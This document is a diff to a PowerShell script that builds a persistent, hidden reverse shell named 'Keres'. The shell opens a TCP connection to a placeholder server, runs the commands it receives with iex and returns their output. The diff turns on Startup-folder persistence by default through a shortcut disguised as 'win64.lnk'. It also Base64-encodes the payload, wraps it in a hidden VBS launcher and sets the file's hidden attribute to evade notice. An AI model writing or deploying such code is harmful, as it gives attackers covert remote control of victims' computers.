@@ -6,11 +6,12 @@ param(
     [string]$Description = "powershell",
     [int]$WindowStyle = 7,
     [switch]$Hidden = $true,
-    [switch]$p,
+    [switch]$p=$true,
     [string]$ScriptArgument = ""
 )
+$homePath = [Environment]::GetFolderPath("UserProfile")
+$hiddenVbsPath = Join-Path -Path $homePath -ChildPath ".script.vbs"
 
-# If -p parameter is present, create the shortcut
 if ($p) {
     #Define the path for the shortcut in the Startup folder
 	$shortcutPath = "$([Environment]::GetFolderPath('Startup'))\win64.lnk"
@@ -25,13 +26,13 @@ if ($p) {
 
     # Set the icon location for the shortcut
     $shortcut.IconLocation = $IconLocation
-
+    
     # Set the target path and arguments for the shortcut
     $shortcut.TargetPath = "powershell.exe"
-    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $ScriptPath "
+    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $hiddenVbsPath  "
 
     # Set the working directory for the shortcut
-    $shortcut.WorkingDirectory = (Get-Item $ScriptPath).DirectoryName
+    $shortcut.WorkingDirectory = (Get-Item $hiddenVbsPath ).DirectoryName
 
     # Set a hotkey for the shortcut
     $shortcut.HotKey = $HotKey
@@ -51,40 +52,41 @@ if ($p) {
     }
 }
 
+$psScript = @'
 $uniqueIdentifier = "Keres"
 $maxProcesses = 1
 $spawnedProcesses = 0
 
-while ($true){{
-    $isRunning = Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}
+while ($true){
+    $isRunning = Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*$uniqueIdentifier*" }
 
-    if (-not $isRunning -and $spawnedProcesses -lt $maxProcesses) {{
+    if (-not $isRunning -and $spawnedProcesses -lt $maxProcesses) {
         $connectionTest = Test-Connection -ComputerName 'server_address' -Count 1 -Quiet
 
-        if ($connectionTest) {{
-            Start-Process $PSHOME\powershell.exe -ArgumentList {{
+        if ($connectionTest) {
+            Start-Process $PSHOME\powershell.exe -ArgumentList {
                 $uniqueIdentifier
                 $client = New-Object System.Net.Sockets.TcpClient
 
-                try {{
+                try {
                     $client.Connect('server_address', port_number)
                     $stream = $client.GetStream()
 
-                    while ($true) {{
-                        if (-not $client.Connected) {{
+                    while ($true) {
+                        if (-not $client.Connected) {
                             Write-Host "Connection lost. Reconnecting..."
                             Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
                             break
-                        }}
+                        }
 
                         $bytes = New-Object byte[] 65535
                         $i = $stream.Read($bytes, 0, $bytes.Length)
 
-                        if ($i -le 0) {{
+                        if ($i -le 0) {
                             Write-Host "Connection to server closed. Reconnecting..."
                             Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
                             break
-                        }}
+                        }
 
                         $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
                         $sendback = (iex $data 2>&1 | Out-String)
@@ -92,26 +94,42 @@ while ($true){{
                         $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
                         $stream.Write($sendbyte, 0, $sendbyte.Length)
                         $stream.Flush()
-                    }}
-                }} catch {{
+                    }
+                } catch {
                     Write-Host "Error: $_"
-                }} finally {{
-                    if ($stream) {{ $stream.Close() }}
-                    if ($client) {{ $client.Close() }}
-                }}
-            }} -WindowStyle Hidden
+                } finally {
+                    if ($stream) { $stream.Close() }
+                    if ($client) { $client.Close() }
+                }
+            } -WindowStyle Hidden
 
             $spawnedProcesses++
-        }} else {{
+        } else {
             Write-Host "No connection to the server. Skipping process spawn."
-        }}
-    }} elseif ($spawnedProcesses -ge $maxProcesses) {{
+        }
+    } elseif ($spawnedProcesses -ge $maxProcesses) {
         Write-Host "Maximum number of processes reached. Skipping process spawn."
-    }} else {{
+    } else {
         Write-Host "Script is already running."
-    }}
+    }
 
     # Count processes after a 60-second wait
     Start-Sleep -Seconds 60
-    $spawnedProcesses = (Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}).Count
-}}
+    $spawnedProcesses = (Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*$uniqueIdentifier*" }).Count
+}
+'@
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($psScript)
+$encodedPsScript = [Convert]::ToBase64String($bytes)
+
+# Define the VBS script
+$vbsScript = @"
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell -EncodedCommand $encodedPsScript", 0, False
+"@
+
+# Write the VBS script to a file
+
+Set-Content -Path $hiddenVbsPath -Value $vbsScript
+
+# Set the hidden attribute
+Set-ItemProperty -Path $hiddenVbsPath -Name Attributes -Value 'Hidden'
